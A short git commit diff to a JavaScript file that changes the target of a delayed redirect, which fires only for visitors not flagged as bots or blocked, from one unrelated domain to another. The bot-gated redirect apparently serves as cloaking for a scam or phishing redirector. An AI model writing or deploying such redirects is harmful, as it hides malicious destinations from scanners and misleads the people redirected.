30992fc489f3a0d1af37b1692d3635b040b4d340
husknet <127146284+husknet@users.noreply.github.com>
2025-01-24 15:27:29 +0000

    Update main.js

--- src/main.js
+++ src/main.js
@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://pt.goldherramientas.com.ar/';
+          window.location.href = 'https://dd.kktgroup.my/';
         }, 3000);
       }
     });
